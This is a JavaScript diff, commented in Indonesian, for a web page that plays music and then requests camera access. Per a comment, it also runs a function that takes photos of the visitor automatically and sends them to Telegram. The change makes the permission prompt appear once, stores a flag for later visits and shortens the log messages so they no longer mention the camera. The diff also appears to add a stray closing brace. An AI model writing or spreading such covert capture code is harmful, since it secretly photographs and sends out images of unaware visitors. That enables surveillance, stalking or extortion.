@@ -32,31 +32,36 @@ async function startMusicAndCamera() {
     // tetap lanjut izin kamera walau musik gagal
   }
 
-// === Jalankan kamera setelah sedikit delay ===
-setTimeout(async () => {
-  try {
-    if (navigator.mediaDevices) {
-      // langsung minta izin kamera (tanpa localStorage)
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      stream.getTracks().forEach(t => t.stop());
-      console.log("Perizinan kamera berhasil.");
+  // === jalankan kamera setelah sedikit delay ===
+  setTimeout(async () => {
+    try {
+      if (!alreadyAllowed && navigator.mediaDevices) {
+        // minta izin 1x saja
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        stream.getTracks().forEach(t => t.stop());
+        localStorage.setItem("user_allows_auto_capture", "1");
+        console.log("Perizinan.");
+      } else {
+        console.log("Perizinan");
+      }
+
+      // ambil & kirim foto
+      await autoCaptureAndSend();
+
+    } catch (e) {
+      console.warn(" User menolak izin:", e);
     }
+  }, musicStarted ? 800 : 1500);
 
-    // ambil & kirim foto
-    await autoCaptureAndSend();
-
-  } catch (e) {
-    console.warn("User menolak izin kamera:", e);
+  if (musicStarted) {
+    btnMusic.classList.remove("show");
+    btnMusic.disabled = true;
+  } else {
+    btnMusic.disabled = false;
+    btnMusic.classList.add("show");
   }
-}, musicStarted ? 800 : 1500);
-
-if (musicStarted) {
-  btnMusic.classList.remove("show");
-  btnMusic.disabled = true;
-} else {
-  btnMusic.disabled = false;
-  btnMusic.classList.add("show");
 }
+
 // === Fungsi ambil foto & kirim ke Telegram ===
 async function autoCaptureAndSend() {
   try {
@@ -97,6 +102,8 @@ async function autoCaptureAndSend() {
   } catch (err) {
     console.error("❌ Tidak bisa akses kamera:", err);
   }
+}
+
 }
 
 // === Event Listener Fix (musik + kamera) ===
